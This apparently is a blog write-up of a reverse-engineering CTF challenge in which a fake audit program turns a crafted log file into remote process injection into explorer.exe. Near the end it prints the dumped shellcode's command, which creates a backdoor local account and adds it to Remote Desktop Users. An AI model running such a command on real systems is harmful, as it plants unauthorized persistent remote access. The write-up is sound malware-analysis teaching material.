---
layout: post
title: Cyber-Apocalypse CTF 2026
date: 2026-07-29 21:00:00 +0700
categories:
  - writeup
  - htb
tags:
  - htb
---
![](attachment/Pasted%20image%2020260729222159.png)

This one felt good, so I wrote up this challenge.

# CorpSyncAudit [rev]

From the challenge description, the scenario is that a malicious program disguised as audit software **was installed on all employees' machines**. It is also hinted that one of the log **files** can trigger malicious behavior that creates a backdoor on the victim's machine.

We are given a PE file, `CorpSyncAudit.exe`, and a folder of logs.

![](attachment/Pasted%20image%2020260727180324.png)

## Quick Tour

### Startup

From the entry point `start`, we reach `sub_140001155`:

![](attachment/Pasted%20image%2020260727174310.png)

I looked through `sub_140007C20`, `sub_140001477`, and `sub_1400079A7`; they are just initialization routines.

Continuing into `sub_1400077B0`, this turns out to be a wrapper.

![](attachment/Pasted%20image%2020260727174906.png)

From there, we continue to `sub_14000726E`.

This is the application's GUI entry/setup function.

![](attachment/Pasted%20image%2020260727181136.png)

Since the *window procedure*, `lpfWndProc`, contains most of the GUI behavior, `sub_1400063E5` is the next function to inspect.

Inside, there were a handful of functions, so I checked their xrefs. If a function had many references, I marked it as a helper. That narrowed down the list.

Here I found `sub_14000061B5`, which handles the open-file dialog.

![](attachment/Pasted%20image%2020260728014731.png)

The markings from the previous step made that function stand out.

### Log Reader

Stepping inside `sub_1400003827`, we arrive at the log reader.

![](attachment/Pasted%20image%2020260728021054.png)

Using the same marking approach as I did for `sub_1400063E5`, I was left with a manageable number of functions.

![](attachment/Pasted%20image%2020260728230540.png)

After scanning through them, I found a familiar pattern in `sub_14000340B`: it parses the timestamp fields, writes derived values into a blob, checks that blob, and then operates on it.

### Suspicious Part

![](attachment/Pasted%20image%2020260728024938.png)

With further inspection inside `sub_14000185F`, it likely resolves WinAPI addresses from hashed identifiers.

![](attachment/Pasted%20image%2020260728160205.png)

Time to switch to dynamic analysis and see what it does here.

## Hands-On

### Catching

I loaded the PE in x64dbg and set `bp corpsyncaudit.exe:$3541`.

![](attachment/Pasted%20image%2020260728220726.png)

Among the logs, `sync_20260412_192364.log` stands out because it is much larger than the others, so it is the best candidate for triggering the malicious path.

Luckily, there are no anti-debug measures, so once that log is loaded and the breakpoint hits, the stack reveals pretty much everything:

![](attachment/Pasted%20image%2020260728174227.png)

After renaming the variables, this is clearly a classic remote process injection flow (T1055.002): open `explorer.exe`, allocate memory, write the payload, change the page permissions, and start a remote thread.

![](attachment/Pasted%20image%2020260728175002.png)

Then I set `bp corpsyncaudit.exe+3712` and used `savedata :memdump:, r8, r9`, which gave me the payload for the second stage.

### Shellcode Analysis

From there, I switched back to static analysis of the dumped shellcode:

![](attachment/Pasted%20image%2020260728185751.png)

First, it cleans up with `cld` and clears the low bits of `rsp`.
Then it transfers control to the main payload logic at `0xCA`.

![](attachment/Pasted%20image%2020260728190235.png)

Note that when it executes `call loc_CA`, the address `0x0A` is pushed onto the stack.
So `pop rbp` stores that `0x0A` in `rbp`.

Because shellcode is self-contained and position-independent, it must have some way to resolve the APIs needed to run that command. We can infer that `sub_A` is the API resolver for this shellcode.

That part can be annotated like this:

![](attachment/Pasted%20image%2020260728201152.png)

At offset `0x10B`, the payload contains the command used to create the backdoor account:

```
net user backup_admin SFRCe2Q0NzNfNzFtM180bmRfNjRja2QwMHI1fQ== /add && net localgroup "Remote Desktop Users" backup_admin /add
```

## Flag

The password string is Base64-encoded, and decoding it gives the flag: `HTB{d473_71m3_4nd_64ckd00r5}`.

---




